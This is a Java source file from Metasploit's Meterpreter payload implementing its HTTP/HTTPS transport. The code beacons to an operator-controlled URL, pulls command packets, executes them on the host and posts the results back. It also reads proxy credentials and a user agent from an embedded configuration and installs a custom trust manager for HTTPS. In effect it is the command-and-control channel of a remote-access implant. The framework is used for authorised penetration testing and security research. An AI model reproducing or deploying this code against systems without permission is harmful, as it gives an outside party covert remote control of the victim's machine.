package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.EOFException;
import java.io.IOException;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

import com.metasploit.meterpreter.command.Command;

public class HttpTransport extends Transport {
    private static final int UA_LEN = 256;
    private static final int PROXY_HOST_LEN = 128;
    private static final int PROXY_USER_LEN = 64;
    private static final int PROXY_PASS_LEN = 64;
    private static final int CERT_HASH_LEN = 20;
    private static final String TRUST_MANAGER = "com.metasploit.meterpreter.PayloadTrustManager";
    private static final byte[] RECV = new byte[]{'R', 'E', 'C', 'V'};

    private URL targetUrl;
    private String userAgent;
    private String proxy;
    private String proxyUser;
    private String proxyPass;
    private byte[] certHash;

    public HttpTransport(String url) throws MalformedURLException {
        super(url);

        this.targetUrl = new URL(url);
    }

    public void bind(DataInputStream in, OutputStream rawOut) {
        // http, we don't bind to anything as we're stateless
    }

    public int parseConfig(byte[] configuration, int offset) {
        offset = this.parseTimeouts(configuration, offset);

        this.proxy = Meterpreter.readString(configuration, offset, PROXY_HOST_LEN);
        offset += PROXY_HOST_LEN;
        System.out.println("msf : Proxy: " + this.proxy);

        this.proxyUser = Meterpreter.readString(configuration, offset, PROXY_USER_LEN);
        offset += PROXY_USER_LEN;
        System.out.println("msf : Proxy User: " + this.proxyUser);

        this.proxyPass = Meterpreter.readString(configuration, offset, PROXY_PASS_LEN);
        offset += PROXY_PASS_LEN;
        System.out.println("msf : Proxy Pass: " + this.proxyPass);

        this.userAgent = Meterpreter.readString(configuration, offset, UA_LEN);
        offset += UA_LEN;
        System.out.println("msf : User agent: " + this.userAgent);

        this.certHash = Meterpreter.readBytes(configuration, offset, CERT_HASH_LEN);
        offset += CERT_HASH_LEN;

        return offset;
    }

    public void disconnect() {
    }

    protected boolean tryConnect(Meterpreter met) throws IOException {
        System.out.println("msf : attempting to read packet on reconnect");
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return false;
        }

        OutputStream outputStream = conn.getOutputStream();
        outputStream.write(RECV);
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            int len = inputStream.readInt();
            int type = inputStream.readInt();
            TLVPacket request = new TLVPacket(inputStream, len - 8);
            inputStream.close();

            // things are looking good, handle the packet and return true, as this
            // is the situation that happens on initial connect (not reconnect)
            TLVPacket response = request.createResponse();
            int result = met.getCommandManager().executeCommand(met, request, response);
            this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

            return true;
        }
        catch (EOFException ex) {
            // this can happens on reconnect
            return true;
        }
        catch (Exception ex) {
        }

        // we get here, thins aren't good.
        return false;
    }

    public TLVPacket readPacket() throws IOException {
        System.out.println("msf : packet read");
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return null;
        }

        OutputStream outputStream = conn.getOutputStream();
        outputStream.write(RECV);
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
          int len = inputStream.readInt();
          int type = inputStream.readInt();
          TLVPacket request = new TLVPacket(inputStream, len - 8);
          inputStream.close();
          return request;
        }
        catch (EOFException ex) {
        }

        return null;
    }

    public void writePacket(TLVPacket packet, int type) throws IOException {
        System.out.println("msf : packet write");
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return;
        }

        byte[] data = packet.toByteArray();
        DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
        outputStream.writeInt(data.length + 8);
        outputStream.writeInt(type);
        outputStream.write(data);
        outputStream.flush();
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
          int len = inputStream.readInt();
          type = inputStream.readInt();
          // not really worried about the response, we just want to read a packet out of it
          // and move on
          new TLVPacket(inputStream, len - 8);
          inputStream.close();
        }
        catch (EOFException ex) {
            // log error?
        }
    }

    public boolean dispatch(Meterpreter met) {
        System.out.println("msf : In the dispatch loop");
        long lastPacket = System.currentTimeMillis();
        long ecount = 0;

        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                System.out.println("msf : Waiting for packet");
                TLVPacket request = this.readPacket();

                if (request != null) {
                    ecount = 0;
                    System.out.println("msf : Packet received");

                    // got a packet, update the timestamp
                    lastPacket = System.currentTimeMillis();

                    TLVPacket response = request.createResponse();
                    int result = met.getCommandManager().executeCommand(met, request, response);

                    this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                    if (result == Command.EXIT_DISPATCH) {
                        return true;
                    }
                } else {
                    long delay = ecount++ * 10;
                    if (ecount >= 10) {
                        delay *= 10;
                    }
                    met.sleep(Math.min(10000, delay));
                }
            } catch (Exception ex) {
                // any other type of exception isn't good.
                System.out.println("msf : Some other exception: " + ex.getClass().getName());
                break;
            }
        }

        // if we get here we assume things aren't good.
        return false;
    }

    private URLConnection createConnection() {
        URLConnection conn = null;

        try {
            conn = this.targetUrl.openConnection();

            if (this.targetUrl.getProtocol().equals("https")) {
                try {
                    Class.forName(TRUST_MANAGER).getMethod("useFor", new Class[]{URLConnection.class})
                      .invoke(null, new Object[]{conn});
                }
                catch (Exception ex) {
                    // perhaps log?
                }

                conn.setDoOutput(true);
            }
        }
        catch (IOException ex) {
            if (conn != null) {
                conn = null;
            }
        }

        return conn;
    }
}

